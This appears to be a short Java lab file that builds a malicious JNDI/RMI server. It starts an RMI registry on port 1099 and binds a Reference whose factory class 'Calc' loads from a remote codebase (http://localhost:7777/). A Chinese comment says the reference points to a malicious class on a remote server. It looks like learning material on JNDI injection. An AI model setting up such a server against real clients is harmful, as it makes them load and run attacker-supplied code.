package Server;

import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);
//        initialContext.bind("rmi://localhost:1099/remoteObj",new RemoteObjectImpl());
        // 绑定的引用对象指定到了远程服务器上的恶意类
        Reference reference = new Reference("Jasper", "Calc", "http://localhost:7777/");
        initialContext.rebind("rmi://localhost:1099/remoteObj",reference);
        System.out.println("Server start...");
    }
}
